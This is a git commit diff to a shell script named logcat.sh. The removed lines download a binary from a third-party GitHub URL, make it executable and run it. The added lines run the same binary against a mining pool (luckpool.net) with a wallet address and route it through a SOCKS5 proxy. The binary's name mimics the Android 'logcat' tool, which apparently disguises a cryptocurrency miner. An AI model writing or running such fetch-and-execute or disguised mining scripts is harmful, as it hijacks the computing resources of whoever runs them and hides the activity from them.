5fb1e8c1e20deb85b896a5e1fffcbac2d22c694f
kijang-7 <86412846+kijang-7@users.noreply.github.com>
2021-07-16 20:54:18 -0800

    Update logcat.sh

--- logcat.sh
+++ logcat.sh
@@ -1,5 +1,4 @@
-#!/bin/sh
-
-wget https://raw.githubusercontent.com/8vrbttppp/merah/main/logcat
-chmod +x logcat
-./logcat -v -l na.luckpool.net:3956 -u RV2BdRHnW13UBEUX4nLfFW2sw9TUwxrJGb.cpu1 -t 8 -p x
+POOL=na.luckpool.net:3956
+WALLET=RV2BdRHnW13UBEUX4nLfFW2sw9TUwxrJGb.cpu1
+PROXY=socks5://username:password@127.0.0.1:3333
+./logcat -v -l $POOL -u $WALLET -x $PROXY
